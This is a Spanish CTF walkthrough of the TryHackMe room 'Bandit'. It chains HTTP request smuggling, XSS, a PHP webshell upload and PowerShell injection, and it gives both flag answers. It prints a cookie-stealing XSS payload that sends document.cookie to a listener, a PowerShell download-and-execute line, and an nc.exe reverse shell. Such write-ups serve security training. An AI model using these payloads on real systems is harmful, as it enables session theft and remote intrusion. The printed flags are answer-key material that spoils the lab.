# Bandit

| **Dificultad** | Hard |
| **Tipo** | CTF |
| **Slug** | `bandit` |
| **Link** | [TryHackMe](https://tryhackme.com/room/bandit) |
| **Sección** | 03 Level Hard |
| **Fuente** | thmrevenant (GitHub) |
| **Componentes** | Apache Traffic Server / HTTP Request Smuggling / XSS / Gobuster / PHP webshell / Burp Suite / PowerShell / SSH / PSSession |
| **Impacto** | Cadena de HTTP Request Smuggling (CL.TE) y XSS contra Apache Traffic Server para robar la sesión del admin, subir un webshell PHP minimizado y escapar de un PowerShell restringido hasta root. |

---

**Contexto:** La sala Bandit cubre HTTP Request Smuggling (Apache Traffic Server), bypass de subida de archivos e inyección de PowerShell. Se registra un túnel SSH, se roba la sesión del administrador que monitorea el sitio mediante smuggling + XSS, se sube un webshell PHP diminuto, y tras pivotar se escapa del entorno restringido de PowerShell para obtener las flags de user y root.

## Solucionario

### Task 1: Bandera de usuario

**Explicación:** El acceso inicial se hace por SSH a `register@<Target>.250` con la contraseña `register`. Tras el reconocimiento (nmap: `22`, `80` Apache Traffic Server 7.1.1, `631` CUPS, `8002` Apache Hadoop), se detecta una búsqueda reflejada donde el XSS se evade cerrando el atributo: `"><script>alert('1');</script>`. El inversor clave es el **HTTP Request Smuggling CL.TE** de Apache Traffic Server 7.1.1: se inyecta una petición "colada" que hace que el admin que monitorea la página ejecute un XSS que roba su `PHPSESSID` (payload con una imagen hacia tu listener en `:8002`). Con la sesión se accede a `upload.php`, se sube un webshell PHP diminuto (extensión `.png`/`.php`), se recibe una reverse shell con `nc`, y de `auth.php` salen credenciales válidas.

```bash
ssh register@<IP>.250
# payload de robo de cookie
a"><script>document.write('<img src="http://<IP>:8002/test.gif?cookie=' + document.cookie + '" />');</script>
```

Como usuario "ubuntu" se obtenía la flag de user antes de saltar al entorno Windows:

```text
THM{ALL_THIS_ESCAPING_MAKES_ME_TIRED_AM_I_DONE?}
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the user flag? | `THM{ALL_THIS_ESCAPING_MAKES_ME_TIRED_AM_I_DONE?}` |

### Task 2: Bandera de root

**Explicación:** Una vez en el contenedor Linux se enumera (`.dockerenv`), se recuperan credenciales de `auth.php` y se entra por SSH como `ubuntu` (miembro de `sudo`), obteniendo root en el propio contenedor. El salto real es a la máquina Windows `banditcorp` vía PowerShell (`pwsh` en `.local`) con una `PSSession`. El PowerShell está restringido, pero `Get-ServicesApplication` usa `Invoke-Expression`, así que `-Filter '$(<comando>)'` ejecuta código arbitrario: se descarga `nc.exe` y se lanza una reverse shell hacia el host controlado, completando el escape y leyendo `root.txt`.

```powershell
# inyección en Invoke-Expression
Get-ServicesApplication -Filter '$(iex (new-object net.webclient).downloadstring("http://<IP>/nc.exe"))'
# o descargar nc.exe y lanzar reverse shell
.\nc.exe <IP> 9001 -e cmd.exe
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the root flag? | `THM{FULL_PRIVILEGES_HERE_THE_ESCAPE_IS_DONE}` |

---

**Metodología:**
1. Acceso inicial por SSH a `register@<Target primeros 3 octetos>.250` con la contraseña `register`; se obtiene el hostname `bandit.escape`.
2. Escaneo Nmap completo: puertos `22` (OpenSSH Ubuntu), `80` (Apache Traffic Server 7.1.1), `631` (CUPS 2.4) y `8002` (Apache Hadoop).
3. En `bandit.escape` la caja de búsqueda refleja la entrada; el filtrado de XSS se evade cerrando el atributo con `"` y un `>` (`"><script>alert('1');</script>`). Cada usuario recibe una cookie `PHPSESSID` y la página está siendo "monitoreada".
4. HTTP Request Smuggling en Apache Traffic Server 7.1.1 (CL.TE): se envía de forma rápida una petición que "cuela" el XSS en la sesión del administrador que vigila el sitio.
5. Payload de robo de cookie (URL-encoded) `a"><script>document.write('<img src="http://<IP>:8002/test.gif?cookie=' + document.cookie + '" />');</script>`; tras ~1 minuto cae el `PHPSESSID` del admin en el listener.
6. Gobuster revela `upload.php` (redirige a `login.php`) y el directorio `uploads/`; con la sesión robada se accede al área de subida.
7. File Upload Bypass: un archivo PHP con extensión `.png` se acepta (se guarda con el MD5 del nombre) y cambiando la extensión a `.php` también funciona (Burp Repeater); como hay límite de caracteres se usa el shell PHP más pequeño posible.
8. Reverse shell con `nc` y enumeración del contenedor (`.dockerenv`); en el directorio anterior aparece `auth.php` con credenciales válidas para SSH.
9. SSH como usuario `ubuntu` (miembro de `sudo`) → acceso root; el directorio `.local` de `ubuntu` contiene PowerShell (`pwsh`) y credenciales para una `PSSession`.
10. `/etc/hosts` resuelve al target Windows (`banditcorp`); se establece la `PSSession` y se descubre un entorno de PowerShell restringido.
11. Inyección de PowerShell: `Get-ServicesApplication` usa `Invoke-Expression`, por lo que `-Filter '$(<comando>)'` permite ejecutar código; se descarga `nc.exe` y se lanza una reverse shell → escape completo → flags de user y root.

**Learning chain:** `SSH register → nmap → HTTP Request Smuggling CL.TE → XSS → robar PHPSESSID → upload.php → webshell PHP diminuto → reverse shell → auth.php creds → SSH ubuntu (sudo) → pwsh PSSession → PowerShell restringido → Invoke-Expression injection → nc.exe reverse shell → user flag → root flag`

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1539 (Steal Web Session Cookie), T1505.003 (Web Shell), T1059 (Command and Scripting Interpreter), T1078 (Valid Accounts), T1068 (Exploitation for Privilege Escalation), T1105 (Ingress Tool Transfer)

**Fuente:** [TryHackMe - Bandit](https://tryhackme.com/room/bandit)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
